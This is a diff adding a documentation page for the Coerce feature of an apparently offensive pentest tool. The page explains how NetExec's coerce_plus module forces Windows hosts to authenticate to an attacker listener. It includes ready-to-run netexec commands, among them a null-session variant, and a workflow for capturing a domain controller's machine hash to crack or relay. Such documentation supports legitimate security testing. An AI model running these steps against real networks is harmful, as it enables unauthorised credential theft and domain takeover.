@@ -1,0 +1,149 @@
+---
+title: Coerce
+description: Force Windows hosts to authenticate to your listener using PetitPotam, PrintSpooler, DFSCoerce, and other coercion methods via the coerce_plus NetExec module.
+---
+
+Coerce exploits Windows RPC calls that cause the target host to make an outbound SMB or HTTP authentication attempt to an IP you control. When paired with Responder, the captured NTLMv2 hash can be cracked offline or relayed.
+
+Navigate to **VULNERABILITIES → Coerce** in the sidebar.
+
+## How coercion works
+
+Various Windows services expose RPC methods that, when called, cause the server to reach back out and authenticate — typically over SMB — to a caller-supplied UNC path. The `coerce_plus` NetExec module bundles multiple such techniques into a single sweep:
+
+- **PetitPotam** — Abuses the EFSRPC interface (`MS-EFSR`) to trigger outbound authentication.
+- **PrintSpooler** — Uses the Windows Print Spooler RPC (`MS-RPRN`) `RpcRemoteFindFirstPrinterChangeNotification` call.
+- **DFSCoerce** — Abuses the Distributed File System Replication (`MS-DFSNM`) `NetrDfsAddStandaloneRoot` call.
+- Additional methods bundled in the `coerce_plus` module are attempted in the same sweep.
+
+With `ALWAYS=true` set, the module continues trying all remaining methods even after one succeeds — ensuring every supported coercion path is exercised and maximising the chance of catching an authentication event.
+
+## Request parameters
+
+The UI submits to `POST /api/coerce/run`:
+
+```json
+{
+  "target": "10.10.10.5",
+  "listener": "10.10.14.1",
+  "username": "operator",
+  "password": "P@ssword1",
+  "domain": "corp.local",
+  "always": true,
+  "method": ""
+}
+```
+
+| Field | Required | Description |
+|---|---|---|
+| `target` | Yes | IP or hostname of the target host to coerce. Supports a single IP, CIDR, or newline/space-separated list. |
+| `listener` | Recommended | Your machine's IP address. The target will authenticate to this address. Auto-filled from the Network Info bar. |
+| `username` | No | Domain username for authenticated coercion. Leave empty for unauthenticated null session. |
+| `password` | No | Password for the supplied username. |
+| `domain` | No | Domain name. Auto-populated from the Network Info bar if not provided. |
+| `always` | No | When `true`, passes `ALWAYS=true` to the module — all methods are attempted regardless of earlier successes. Enabled by default in the UI. |
+| `method` | No | Restrict to a single coercion method by name. Leave empty to run all available methods. |
+
+<Note>
+  Credentials are optional. An unauthenticated null session (`-u '' -p ''`) is used when no username is supplied, which is sufficient for PetitPotam on many unpatched systems.
+</Note>
+
+## The ALWAYS=true flag
+
+Without `ALWAYS=true`, the `coerce_plus` module stops after it receives a successful authentication response — meaning only the first working coercion method fires. With `ALWAYS=true`, every method in the list is executed in sequence regardless of earlier results.
+
+This matters in practice because:
+
+- Different methods succeed against different patch levels.
+- You may want hashes from multiple coercion paths for comparison.
+- Listener capture may miss the first event; later methods provide a second chance.
+
+The UI enables `ALWAYS=true` by default.
+
+## Multi-target support
+
+Paste multiple IP addresses (newline- or space-separated) into the target field to coerce a range of hosts in a single run. Alternatively, populate your scope in **DATA → Scope** and use the **From Database** option to load targets automatically.
+
+## Running coerce
+
+<Steps>
+  <Step title="Start Responder">
+    Go to **LAYER2 → Responder** and start Responder on the interface facing the target network (e.g. `eth0` or `tun0`). Responder will capture any incoming NTLMv2 authentication triggered by the coercion.
+  </Step>
+  <Step title="Open the Coerce panel">
+    Navigate to **VULNERABILITIES → Coerce**.
+  </Step>
+  <Step title="Set the target">
+    Enter the DC IP or any target host you want to coerce. For a domain controller, use its IP directly. You can enter multiple IPs separated by newlines.
+  </Step>
+  <Step title="Verify listener IP">
+    The listener field is auto-populated from the Network Info bar. Confirm it matches the interface Responder is listening on.
+  </Step>
+  <Step title="Configure methods">
+    All coercion methods are checked by default. Leave the **Method** field empty to run all of them. `ALWAYS=true` is enabled by default.
+  </Step>
+  <Step title="Enter credentials (optional)">
+    Supply domain credentials if the target requires authentication. For null session coercion, leave the credential fields empty.
+  </Step>
+  <Step title="Click Run">
+    EtherReaper builds the `netexec smb` command and executes it. Output streams to the result panel.
+  </Step>
+</Steps>
+
+## Command built by the backend
+
+For an authenticated run with all methods and `ALWAYS=true`:
+
+```bash
+netexec smb 10.10.10.5 -u operator -p P@ssword1 -d corp.local -M coerce_plus -o LISTENER=10.10.14.1 ALWAYS=true
+```
+
+For a null session run:
+
+```bash
+netexec smb 10.10.10.5 -u '' -p '' -M coerce_plus -o LISTENER=10.10.14.1 ALWAYS=true
+```
+
+The displayed command in the UI uses the unquoted form. The actual subprocess uses `shlex.quote` on all variable fields.
+
+## Live cancellation
+
+Click **Kill** while coerce is running to abort the operation. The UI aborts the fetch loop and calls `POST /api/scans/kill` with the `scan_id`. The backend runs `pkill -f coerce_plus` and marks the scan record as `killed` in the database.
+
+<Note>
+  If the underlying `netexec` process continues after the kill request, check **DATA → Scan History** for the scan status. Inspect running processes manually if needed.
+</Note>
+
+## Output file
+
+Results are written to a timestamped file:
+
+```
+recon/coerce_<target>_<YYYYMMDD_HHMMSS>.txt
+```
+
+The file is linked from **DATA → Scan History** for the corresponding scan entry.
+
+## Workflow: coerce a DC for hash capture
+
+<Steps>
+  <Step title="Start Responder on eth0 or tun0">
+    Ensure Responder is listening on the same interface your listener IP belongs to.
+  </Step>
+  <Step title="Set target to DC IP, listener to your IP">
+    The DC will authenticate back to your machine when coerced.
+  </Step>
+  <Step title="Run Coerce">
+    The `coerce_plus` module fires all available methods against the DC.
+  </Step>
+  <Step title="Check Responder output for the machine hash">
+    Responder captures the incoming NTLMv2 hash from the DC machine account (e.g. `DC01$`).
+  </Step>
+  <Step title="Crack or relay the hash">
+    Crack offline with hashcat (`-m 5600`) or relay the machine account hash with ntlmrelayx.
+  </Step>
+</Steps>
+
+<Tip>
+  Machine account hashes (`DC01$`) captured via coercion can often be relayed to LDAP for RBCD (Resource-Based Constrained Delegation) attacks or S4U2Self/S4U2Proxy chains.
+</Tip>
